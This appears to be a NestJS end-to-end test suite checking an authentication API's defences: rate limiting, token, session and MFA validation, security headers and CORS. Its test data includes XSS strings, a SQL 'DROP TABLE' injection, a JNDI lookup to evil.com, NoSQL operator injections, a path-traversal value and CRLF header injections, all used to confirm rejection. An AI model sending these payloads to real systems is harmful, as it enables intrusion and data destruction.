import { Test, TestingModule } from '@nestjs/testing';
import { INestApplication } from '@nestjs/common';
import request from 'supertest';
import { TypeOrmModule } from '@nestjs/typeorm';
import { ConfigModule } from '@nestjs/config';
import { ThrottlerModule } from '@nestjs/throttler';

import { AuthModule } from './auth.module';
import { User } from '../users/entities/user.entity';
import { Tenant } from '../tenants/entities/tenant.entity';
import { RefreshToken } from './entities/refresh-token.entity';
import { Session } from './entities/session.entity';

describe('Authentication Security (e2e)', () => {
  let app: INestApplication;
  let accessToken: string;
  let refreshToken: string;
  let userId: string;
  let sessionId: string;

  const testUser = {
    email: 'security.test@example.com',
    password: 'SecurePassword123!',
    firstName: 'Security',
    lastName: 'Test',
  };

  const testTenant = {
    name: 'Security Test Company',
    domain: 'securitytest.com',
    description: 'Security test tenant',
    contactEmail: 'admin@securitytest.com',
    contactPhone: '+1234567890',
    address: '123 Security Street',
    city: 'Test City',
    state: 'Test State',
    postalCode: '12345',
    country: 'US',
    timezone: 'America/New_York',
    locale: 'en-US',
    currency: 'USD',
    marketingConsent: true,
    acceptTerms: true,
  };

  beforeAll(async () => {
    const moduleFixture: TestingModule = await Test.createTestingModule({
      imports: [
        ConfigModule.forRoot({
          isGlobal: true,
          envFilePath: '.env.test',
        }),
        ThrottlerModule.forRoot([
          {
            name: 'short',
            ttl: 1000,
            limit: 3,
          },
          {
            name: 'medium',
            ttl: 10000,
            limit: 20,
          },
        ]),
        TypeOrmModule.forRoot({
          type: 'postgres',
          host: process.env.DB_HOST || 'localhost',
          port: parseInt(process.env.DB_PORT || '5432'),
          username: process.env.DB_USERNAME || 'postgres',
          password: process.env.DB_PASSWORD || 'password',
          database: process.env.DB_DATABASE || 'saas_boilerplate_test',
          entities: [User, Tenant, RefreshToken, Session],
          synchronize: true,
          logging: false,
        }),
        AuthModule,
      ],
    }).compile();

    app = moduleFixture.createNestApplication();
    
    // Apply global pipes and middleware like in main.ts
    const { ValidationPipe } = await import('@nestjs/common');
    app.useGlobalPipes(new ValidationPipe({
      whitelist: true,
      forbidNonWhitelisted: true,
      transform: true,
    }));
    
    app.setGlobalPrefix('api');
    await app.init();

    // Create a test user for security tests
    const registerResponse = await request(app.getHttpServer())
      .post('/api/auth/register')
      .send({ ...testUser, ...testTenant })
      .expect(201);

    userId = registerResponse.body.userId;

    // Login to get tokens
    const loginResponse = await request(app.getHttpServer())
      .post('/api/auth/login')
      .send({
        email: testUser.email,
        password: testUser.password,
      })
      .expect(200);

    accessToken = loginResponse.body.accessToken;
    refreshToken = loginResponse.body.refreshToken;
  });

  afterAll(async () => {
    await app.close();
  });

  describe('Brute Force Protection', () => {
    it('should block multiple failed login attempts', async () => {
      const invalidCredentials = {
        email: testUser.email,
        password: 'WrongPassword123!',
      };

      // Make multiple failed attempts
      for (let i = 0; i < 3; i++) {
        await request(app.getHttpServer())
          .post('/api/auth/login')
          .send(invalidCredentials)
          .expect(401);
      }

      // Fourth attempt should be rate limited
      await request(app.getHttpServer())
        .post('/api/auth/login')
        .send(invalidCredentials)
        .expect(429);
    });

    it('should rate limit forgot password requests', async () => {
      const forgotPasswordData = { email: testUser.email };

      // Make allowed requests
      await request(app.getHttpServer())
        .post('/api/auth/forgot-password')
        .send(forgotPasswordData)
        .expect(200);

      await request(app.getHttpServer())
        .post('/api/auth/forgot-password')
        .send(forgotPasswordData)
        .expect(200);

      await request(app.getHttpServer())
        .post('/api/auth/forgot-password')
        .send(forgotPasswordData)
        .expect(200);

      // Fourth request should be rate limited
      await request(app.getHttpServer())
        .post('/api/auth/forgot-password')
        .send(forgotPasswordData)
        .expect(429);
    });

    it('should rate limit password reset attempts', async () => {
      const resetData = {
        token: 'fake-reset-token',
        newPassword: 'NewPassword123!',
      };

      // Make multiple reset attempts
      for (let i = 0; i < 5; i++) {
        await request(app.getHttpServer())
          .post('/api/auth/reset-password')
          .send(resetData)
          .expect(400); // Invalid token
      }

      // Sixth attempt should be rate limited
      await request(app.getHttpServer())
        .post('/api/auth/reset-password')
        .send(resetData)
        .expect(429);
    });
  });

  describe('Input Validation Security', () => {
    it('should reject registration with invalid email formats', async () => {
      const invalidEmails = [
        'invalid-email',
        '@domain.com',
        'user@',
        'user@domain',
        'user..double.dot@domain.com',
        'user@domain..com',
      ];

      for (const email of invalidEmails) {
        await request(app.getHttpServer())
          .post('/api/auth/register')
          .send({
            ...testUser,
            ...testTenant,
            email,
          })
          .expect(400);
      }
    });

    it('should reject registration with weak passwords', async () => {
      const weakPasswords = [
        '123',
        'password',
        '12345678',
        'PASSWORD',
        'Password',
        'pass word',
      ];

      for (const password of weakPasswords) {
        await request(app.getHttpServer())
          .post('/api/auth/register')
          .send({
            ...testUser,
            ...testTenant,
            email: `weak${Date.now()}@test.com`,
            password,
          })
          .expect(400);
      }
    });

    it('should reject requests with malicious payloads', async () => {
      const maliciousPayloads = [
        { email: '<script>alert("xss")</script>@test.com' },
        { firstName: "'; DROP TABLE users; --" },
        { lastName: '<img src=x onerror=alert("xss")>' },
        { tenantName: '${jndi:ldap://evil.com/a}' },
      ];

      for (const payload of maliciousPayloads) {
        await request(app.getHttpServer())
          .post('/api/auth/register')
          .send({
            ...testUser,
            ...testTenant,
            ...payload,
            email: `malicious${Date.now()}@test.com`,
          })
          .expect(400);
      }
    });
  });

  describe('Authorization Security', () => {
    it('should reject requests without authorization token', async () => {
      const protectedEndpoints = [
        { method: 'get', path: '/api/auth/profile' },
        { method: 'post', path: '/api/auth/logout' },
        { method: 'get', path: '/api/auth/mfa/status' },
        { method: 'get', path: '/api/sessions' },
      ];

      for (const endpoint of protectedEndpoints) {
        const response = await request(app.getHttpServer())[endpoint.method](endpoint.path);
        expect([401, 403]).toContain(response.status);
      }
    });

    it('should reject requests with invalid tokens', async () => {
      const invalidTokens = [
        'invalid-token',
        'Bearer invalid-token',
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature',
        '',
        'null',
        'undefined',
      ];

      for (const token of invalidTokens) {
        await request(app.getHttpServer())
          .get('/api/auth/profile')
          .set('Authorization', `Bearer ${token}`)
          .expect(401);
      }
    });

    it('should reject expired tokens', async () => {
      // This would need a way to create an expired token
      // For now, we'll test with a malformed token that simulates expiry
      const expiredToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzkwMjJ9.invalid';
      
      await request(app.getHttpServer())
        .get('/api/auth/profile')
        .set('Authorization', `Bearer ${expiredToken}`)
        .expect(401);
    });
  });

  describe('Session Security', () => {
    it('should prevent session hijacking with invalid session IDs', async () => {
      const invalidSessionIds = [
        'invalid-session-id',
        '00000000-0000-0000-0000-000000000000',
        'script-injection-attempt',
        '../../../etc/passwd',
        'null',
      ];

      for (const sessionId of invalidSessionIds) {
        await request(app.getHttpServer())
          .get(`/api/sessions/${sessionId}`)
          .set('Authorization', `Bearer ${accessToken}`)
          .expect(404); // Session not found is acceptable
      }
    });

    it('should validate session ownership', async () => {
      // Get user sessions first
      const sessionsResponse = await request(app.getHttpServer())
        .get('/api/sessions')
        .set('Authorization', `Bearer ${accessToken}`)
        .expect(200);

      if (sessionsResponse.body.sessions && sessionsResponse.body.sessions.length > 0) {
        const sessionId = sessionsResponse.body.sessions[0].id;

        // Try to access session with different user token (if we had one)
        // For now, we'll test that the session exists for the current user
        await request(app.getHttpServer())
          .get(`/api/sessions/${sessionId}`)
          .set('Authorization', `Bearer ${accessToken}`)
          .expect(200);
      }
    });

    it('should prevent concurrent session abuse', async () => {
      // Test rapid successive requests to detect potential abuse
      const promises = [];
      for (let i = 0; i < 10; i++) {
        promises.push(
          request(app.getHttpServer())
            .get('/api/auth/profile')
            .set('Authorization', `Bearer ${accessToken}`)
        );
      }

      const responses = await Promise.all(promises);
      
      // All requests should succeed or some might be rate limited
      responses.forEach(response => {
        expect([200, 429]).toContain(response.status);
      });
    });
  });

  describe('MFA Security', () => {
    it('should prevent MFA bypass attempts', async () => {
      const invalidMfaCodes = [
        '000000',
        '123456',
        'abcdef',
        '      ', // spaces
        '12345',  // too short
        '1234567', // too long
        'inject',
        '<script>',
      ];

      for (const code of invalidMfaCodes) {
        await request(app.getHttpServer())
          .post('/api/auth/mfa/verify')
          .send({
            userId: userId,
            token: code,
          })
          .expect(400);
      }
    });

    it('should rate limit MFA verification attempts', async () => {
      // Make multiple failed MFA attempts
      for (let i = 0; i < 5; i++) {
        await request(app.getHttpServer())
          .post('/api/auth/mfa/verify')
          .send({
            userId: userId,
            token: '000000',
          })
          .expect(400);
      }

      // Additional attempts should be rate limited or blocked
      const response = await request(app.getHttpServer())
        .post('/api/auth/mfa/verify')
        .send({
          userId: userId,
          token: '000000',
        });

      expect([400, 429]).toContain(response.status);
    });
  });

  describe('Data Sanitization', () => {
    it('should sanitize user input to prevent NoSQL injection', async () => {
      const injectionAttempts = [
        { email: { "$ne": null } },
        { password: { "$gt": "" } },
        { email: "admin@test.com\"; return true; var fake=\"" },
        { firstName: { "$where": "function() { return true; }" } },
      ];

      for (const attempt of injectionAttempts) {
        await request(app.getHttpServer())
          .post('/api/auth/login')
          .send({
            email: 'test@example.com',
            password: 'password',
            ...attempt,
          })
          .expect(400); // Should fail validation
      }
    });

    it('should prevent header injection attacks', async () => {
      const maliciousHeaders = [
        'X-Forwarded-For: 127.0.0.1\r\nX-Injected: malicious',
        'User-Agent: Mozilla/5.0\r\nSet-Cookie: admin=true',
        'Authorization: Bearer token\r\nX-Admin: true',
      ];

      for (const header of maliciousHeaders) {
        const response = await request(app.getHttpServer())
          .post('/api/auth/login')
          .set('User-Agent', header)
          .send({
            email: testUser.email,
            password: testUser.password,
          });

        // Should not contain injected headers in response
        expect(response.headers['x-injected']).toBeUndefined();
        expect(response.headers['x-admin']).toBeUndefined();
      }
    });
  });

  describe('Response Security', () => {
    it('should not leak sensitive information in error messages', async () => {
      const sensitiveEndpoints = [
        { method: 'post', path: '/api/auth/login', data: { email: 'nonexistent@test.com', password: 'wrong' }},
        { method: 'post', path: '/api/auth/reset-password', data: { token: 'invalid', newPassword: 'new123' }},
        { method: 'post', path: '/api/auth/verify-email', data: { token: 'invalid' }},
      ];

      for (const endpoint of sensitiveEndpoints) {
        const response = await request(app.getHttpServer())[endpoint.method](endpoint.path)
          .send(endpoint.data);

        // Error messages should not contain sensitive information
        const responseText = JSON.stringify(response.body).toLowerCase();
        
        expect(responseText).not.toContain('password');
        expect(responseText).not.toContain('hash');
        expect(responseText).not.toContain('salt');
        expect(responseText).not.toContain('database');
        expect(responseText).not.toContain('internal');
        expect(responseText).not.toContain('stack');
        expect(responseText).not.toContain('prisma');
      }
    });

    it('should set proper security headers', async () => {
      const response = await request(app.getHttpServer())
        .post('/api/auth/login')
        .send({
          email: testUser.email,
          password: testUser.password,
        })
        .expect(200);

      // Check for security headers (these might be set by helmet middleware)
      expect(response.headers['x-frame-options']).toBeDefined();
      expect(response.headers['x-content-type-options']).toBe('nosniff');
      expect(response.headers['x-xss-protection']).toBeDefined();
    });

    it('should not expose system information', async () => {
      const response = await request(app.getHttpServer())
        .get('/api/auth/profile')
        .set('Authorization', `Bearer ${accessToken}`)
        .expect(200);

      // Response should not contain system information
      expect(response.headers['x-powered-by']).toBeUndefined();
      expect(response.headers['server']).not.toContain('Express');
      expect(response.body).not.toHaveProperty('__v');
      expect(response.body).not.toHaveProperty('_id');
    });
  });

  describe('CORS Security', () => {
    it('should enforce CORS policy', async () => {
      const response = await request(app.getHttpServer())
        .options('/api/auth/login')
        .set('Origin', 'https://malicious-site.com')
        .set('Access-Control-Request-Method', 'POST');

      // CORS should be configured to reject unauthorized origins
      if (response.status === 200) {
        // If preflight passes, check that only allowed origins are accepted
        expect(response.headers['access-control-allow-origin']).not.toBe('*');
      }
    });
  });
});
